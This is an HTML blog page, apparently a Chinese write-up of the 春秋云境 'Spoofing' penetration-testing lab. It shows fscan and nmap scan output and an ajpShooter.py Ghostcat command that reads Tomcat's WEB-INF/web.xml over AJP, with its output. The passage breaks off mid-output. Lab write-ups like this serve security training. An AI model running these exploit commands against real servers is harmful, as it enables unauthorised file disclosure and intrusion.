@@ -1,0 +1,677 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaotian">
+  <meta name="keywords" content="xt,blog,个人博客,生活,学习,工作">
+  
+    <meta name="description" content="春秋云境Spoofingfscan扫 12345678910111213141516171819202122232425E:\Users\tiand&gt;fscan -h 39.99.131.161┌──────────────────────────────────────────────┐│    ___                              _        ││">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境Spoofing">
+<meta property="og:url" content="https://www.xiaotian.org.cn/2026/03/17/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Spoofing/index.html">
+<meta property="og:site_name" content="xt&#39;s blog">
+<meta property="og:description" content="春秋云境Spoofingfscan扫 12345678910111213141516171819202122232425E:\Users\tiand&gt;fscan -h 39.99.131.161┌──────────────────────────────────────────────┐│    ___                              _        ││">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-17T14:15:08.000Z">
+<meta property="article:modified_time" content="2026-03-17T06:58:43.842Z">
+<meta property="article:author" content="xiaotian">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>春秋云境Spoofing - xt&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.xiaotian.org.cn","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xt&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云境Spoofing"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-17 22:15" pubdate>
+          2026年3月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云境Spoofing</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="春秋云境Spoofing"><a href="#春秋云境Spoofing" class="headerlink" title="春秋云境Spoofing"></a>春秋云境Spoofing</h1><p>fscan扫</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">E:\Users\tiand&gt;fscan -h 39.99.131.161<br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___|<span class="hljs-string"> </span>|<span class="hljs-string"> __    │</span><br><span class="hljs-string">│  / /_\/____/ __</span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> &#x27;__/ _` </span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string">   &lt;     │</span><br><span class="hljs-string">│ \____/     </span>|<span class="hljs-string">___/\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">  \__,_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[795ms]     已选择服务扫描模式</span><br><span class="hljs-string">[795ms]     开始信息扫描</span><br><span class="hljs-string">[795ms]     最终有效主机数量: 1</span><br><span class="hljs-string">[795ms]     开始主机扫描</span><br><span class="hljs-string">[796ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[796ms]     有效端口数量: 233</span><br><span class="hljs-string">[960ms] [*] 端口开放 39.99.131.161:8009</span><br><span class="hljs-string">[970ms] [*] 端口开放 39.99.131.161:22</span><br><span class="hljs-string">[970ms] [*] 端口开放 39.99.131.161:8080</span><br><span class="hljs-string">[3.8s]     扫描完成, 发现 3 个开放端口</span><br><span class="hljs-string">[3.8s]     存活端口数量: 3</span><br><span class="hljs-string">[3.8s]     开始漏洞扫描</span><br><span class="hljs-string">[3.8s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-string">[4.7s] [*] 网站标题 http://39.99.131.161:8080 状态码:200 长度:7091   标题:后台管理</span><br><span class="hljs-string">[22.3s]     扫描已完成: 5/5</span><br></code></pre></td></tr></table></figure>
+
+<p>nmap</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs swift">nmap <span class="hljs-operator">-</span><span class="hljs-type">T4</span> <span class="hljs-operator">-</span><span class="hljs-type">A</span> <span class="hljs-operator">-</span>v <span class="hljs-operator">-</span><span class="hljs-type">Pn</span> <span class="hljs-operator">--</span>unprivileged <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span><br><br><span class="hljs-type">Host</span> discovery disabled (<span class="hljs-operator">-</span><span class="hljs-type">Pn</span>). <span class="hljs-type">All</span> addresses will be marked &#x27;up&#x27; and scan times may be slower.<br><span class="hljs-type">Starting</span> <span class="hljs-type">Nmap</span> <span class="hljs-number">7.95</span> ( https:<span class="hljs-comment">//nmap.org ) at 2026-03-17 13:21 中国标准时间</span><br>NSE: <span class="hljs-type">Loaded</span> <span class="hljs-number">157</span> scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: <span class="hljs-type">Script</span> <span class="hljs-type">Pre</span><span class="hljs-operator">-</span>scanning.<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">Parallel</span> <span class="hljs-type">DNS</span> resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">Parallel</span> <span class="hljs-type">DNS</span> resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.59s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">Connect</span> <span class="hljs-type">Scan</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Scanning</span> <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span> [<span class="hljs-number">1000</span> ports]<br><span class="hljs-type">Discovered</span> <span class="hljs-keyword">open</span> port <span class="hljs-number">8080</span><span class="hljs-operator">/</span>tcp on <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span><br><span class="hljs-type">Discovered</span> <span class="hljs-keyword">open</span> port <span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp on <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span><br><span class="hljs-type">Discovered</span> <span class="hljs-keyword">open</span> port <span class="hljs-number">8009</span><span class="hljs-operator">/</span>tcp on <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">Connect</span> <span class="hljs-type">Scan</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">12</span>.92s elapsed (<span class="hljs-number">1000</span> total ports)<br><span class="hljs-type">Initiating</span> <span class="hljs-type">Service</span> scan at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Scanning</span> <span class="hljs-number">3</span> services on <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">Service</span> scan at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">12</span>.96s elapsed (<span class="hljs-number">3</span> services on <span class="hljs-number">1</span> host)<br>NSE: <span class="hljs-type">Script</span> scanning <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span>.<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">5</span>.15s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.47s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">39.99</span>.<span class="hljs-number">131.161</span><br><span class="hljs-type">Host</span> <span class="hljs-keyword">is</span> up (<span class="hljs-number">0</span>.092s latency).<br><span class="hljs-type">Not</span> shown: <span class="hljs-number">997</span> filtered tcp ports (no<span class="hljs-operator">-</span>response)<br><span class="hljs-type">PORT</span>     <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ssh     <span class="hljs-type">OpenSSH</span> <span class="hljs-number">8</span>.2p1 <span class="hljs-type">Ubuntu</span> 4ubuntu0.<span class="hljs-number">5</span> (<span class="hljs-type">Ubuntu</span> <span class="hljs-type">Linux</span>; <span class="hljs-keyword">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-operator">|</span> ssh<span class="hljs-operator">-</span>hostkey: <br><span class="hljs-operator">|</span>   <span class="hljs-number">3072</span> ba:9e:8c:<span class="hljs-number">02</span>:<span class="hljs-number">06</span>:f6:<span class="hljs-number">07</span>:<span class="hljs-number">64</span>:af:<span class="hljs-number">66</span>:<span class="hljs-number">64</span>:ff:fd:7c:2b:a8 (<span class="hljs-type">RSA</span>)<br><span class="hljs-operator">|</span>   <span class="hljs-number">256</span> <span class="hljs-number">38</span>:af:5d:<span class="hljs-number">33</span>:2d:9e:f2:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:4e:<span class="hljs-number">85</span>:8c:<span class="hljs-number">66</span>:<span class="hljs-number">46</span>:<span class="hljs-number">63</span>:<span class="hljs-number">07</span> (<span class="hljs-type">ECDSA</span>)<br><span class="hljs-operator">|</span><span class="hljs-keyword">_</span>  <span class="hljs-number">256</span> 6f:<span class="hljs-number">65</span>:<span class="hljs-number">14</span>:7b:9e:<span class="hljs-number">68</span>:1c:<span class="hljs-number">14</span>:a7:<span class="hljs-number">05</span>:a8:9c:f4:fe:ef:<span class="hljs-number">20</span> (<span class="hljs-type">ED25519</span>)<br><span class="hljs-number">8009</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ajp13   <span class="hljs-type">Apache</span> <span class="hljs-type">Jserv</span> (<span class="hljs-type">Protocol</span> v1.<span class="hljs-number">3</span>)<br><span class="hljs-operator">|</span> ajp<span class="hljs-operator">-</span>methods: <br><span class="hljs-operator">|</span><span class="hljs-keyword">_</span>  <span class="hljs-type">Supported</span> methods: <span class="hljs-type">OPTIONS</span> <span class="hljs-type">GET</span> <span class="hljs-type">HEAD</span> <span class="hljs-type">POST</span><br><span class="hljs-number">8080</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  http    <span class="hljs-type">Apache</span> <span class="hljs-type">Tomcat</span> (language: en)<br><span class="hljs-operator">|</span> http<span class="hljs-operator">-</span>methods: <br><span class="hljs-operator">|</span><span class="hljs-keyword">_</span>  <span class="hljs-type">Supported</span> Methods: <span class="hljs-type">OPTIONS</span> <span class="hljs-type">GET</span> <span class="hljs-type">HEAD</span> <span class="hljs-type">POST</span><br><span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: \xE5\x90\x8E\xE5\x8F\xB0\xE7\xAE\xA1\xE7\x90\x86<br><span class="hljs-type">Service</span> Info: OS: <span class="hljs-type">Linux</span>; CPE: cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel<br><br>NSE: <span class="hljs-type">Script</span> <span class="hljs-type">Post</span><span class="hljs-operator">-</span>scanning.<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Initiating</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span><br><span class="hljs-type">Completed</span> <span class="hljs-type">NSE</span> at <span class="hljs-number">13</span>:<span class="hljs-number">21</span>, <span class="hljs-number">0</span>.00s elapsed<br><span class="hljs-type">Read</span> data files from: D:\<span class="hljs-type">Program</span> <span class="hljs-type">Files</span> (x86)\<span class="hljs-type">Nmap</span><br><span class="hljs-type">Service</span> detection performed. <span class="hljs-type">Please</span> report <span class="hljs-keyword">any</span> incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-type">Nmap</span> done: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">32.87</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="Tomcat-ajp-Ghostcat"><a href="#Tomcat-ajp-Ghostcat" class="headerlink" title="Tomcat ajp Ghostcat"></a>Tomcat ajp Ghostcat</h2><p>有Tomcat的ajp协议，可以尝试Ghostcat：<a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
+<p>看到需要上传一个恶意文件然后执行，扫一下目录找上传点，没找到</p>
+<p>读配置文件WEB-INF&#x2F;web.xml找上传接口</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">E:\exploit\tools\Ghostcat-CNVD-2020-10487&gt; python ajpShooter.py http://39.98.112.38:8080/ 8009 /WEB-INF/web.xml read<br><br>       _    _         __ _                 _<br>      /_\  (_)_ __   / _\ |<span class="hljs-string">__   ___   ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ ___ _ __</span><br><span class="hljs-string">     //_\\ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \  \ \</span>|<span class="hljs-string"> &#x27;_ \ / _ \ / _ \</span>|<span class="hljs-string"> __/ _ \ &#x27;__</span>|<br>    /  _  \|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> _\ \ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>||<span class="hljs-string">  __/ </span>|<br>    \_/ \_// |<span class="hljs-string"> .__/  \__/_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___/ \___/ \__\___</span>|<span class="hljs-string">_</span>|<br>         |<span class="hljs-string">__/</span>|<span class="hljs-string">_</span>|<br>                                                00theway,just for test<br><br><br>[<span class="hljs-variable">&lt;] 200 200</span><br><span class="hljs-variable">[&lt;] Accept-Ranges: bytes</span><br><span class="hljs-variable">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span><br><span class="hljs-variable">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span><br><span class="hljs-variable">[&lt;] Content-Type: application/xml</span><br><span class="hljs-variable">[&lt;] Content-Length: 2489</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="hljs-variable"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="hljs-variable"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><br><span class="hljs-variable">&lt;web-app&gt;</span><br>  <span class="hljs-variable">&lt;display-name&gt;</span>Archetype Created Web Application<span class="hljs-variable">&lt;/display-name&gt;</span><br><br>  <span class="hljs-variable">&lt;security-constraint&gt;</span><br>    <span class="hljs-variable">&lt;display-name&gt;</span>Tomcat Server Configuration Security Constraint<span class="hljs-variable">&lt;/display-name&gt;</span><br>    <span class="hljs-variable">&lt;web-resource-collection&gt;</span><br>      <span class="hljs-variable">&lt;web-resource-name&gt;</span>Protected Area<span class="hljs-variable">&lt;/web-resource-name&gt;</span><br>      <span class="hljs-variable">&lt;url-pattern&gt;</span>/upload/<span class="hljs-symbol">*</span><span class="hljs-variable">&lt;/url-pattern&gt;</span><br>    <span class="hljs-variable">&lt;/web-resource-collection&gt;</span><br>    <span class="hljs-variable">&lt;auth-constraint&gt;</span><br>      <span class="hljs-variable">&lt;role-name&gt;</span>admin<span class="hljs-variable">&lt;/role-name&gt;</span><br>    <span class="hljs-variable">&lt;/auth-constraint&gt;</span><br>  <span class="hljs-variable">&lt;/security-constraint&gt;</span><br><br>  <span class="hljs-variable">&lt;error-page&gt;</span><br>    <span class="hljs-variable">&lt;error-code&gt;</span>404<span class="hljs-variable">&lt;/error-code&gt;</span><br>    <span class="hljs-variable">&lt;location&gt;</span>/404.html<span class="hljs-variable">&lt;/location&gt;</span><br>  <span class="hljs-variable">&lt;/error-page&gt;</span><br><br>  <span class="hljs-variable">&lt;error-page&gt;</span><br>    <span class="hljs-variable">&lt;error-code&gt;</span>403<span class="hljs-variable">&lt;/error-code&gt;</span><br>    <span class="hljs-variable">&lt;location&gt;</span>/error.html<span class="hljs-variable">&lt;/location&gt;</span><br>  <span class="hljs-variable">&lt;/error-page&gt;</span><br><br>  <span class="hljs-variable">&lt;error-page&gt;</span><br>    <span class="hljs-variable">&lt;exception-type&gt;</span>java.lang.Throwable<span class="hljs-variable">&lt;/exception-type&gt;</span><br>    <span class="hljs-variable">&lt;location&gt;</span>/error.html<span class="hljs-variable">&lt;/location&gt;</span><br>  <span class="hljs-variable">&lt;/error-page&gt;</span><br><br>  <span class="hljs-variable">&lt;servlet&gt;</span><br>    